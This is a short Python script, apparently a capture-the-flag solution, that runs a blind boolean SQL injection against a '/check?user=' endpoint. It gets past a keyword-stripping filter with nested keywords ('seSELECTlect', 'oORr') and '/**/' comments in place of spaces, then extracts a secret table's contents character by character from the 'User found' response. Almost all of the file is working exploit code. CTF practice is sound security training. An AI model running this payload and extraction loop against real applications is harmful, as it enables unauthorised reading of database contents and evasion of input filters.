import urllib.parse
from helper import get_raw

CHARSET = "FLAG{}_abcdefghijklmnopqrstuvwxyz0123456789"

# Bypass building blocks:
#   space   -> /**/ (comment acts as a token separator, not a space)
#   select  -> seSELECTlect  (inner match stripped, outer halves re-form it)
#   or      -> oORr
OR = "oORr"
SELECT = "seSELECTlect"

def oracle(cond):
    # no spaces anywhere; keywords nested so the filter re-forms them
    payload = f"zzz'/**/{OR}/**/({cond})/**/{OR}/**/'a'='b"
    return "User found" in get_raw("/check?user=" + urllib.parse.quote(payload))

flag = ""
for pos in range(1, 60):
    for ch in CHARSET:
        cond = (f"substr(({SELECT}/**/flag/**/from/**/secret_flag),{pos},1)"
                f"='{ch}'")
        if oracle(cond):
            flag += ch
            break
    else:
        break
    if flag.endswith("}"):
        break
print(flag)
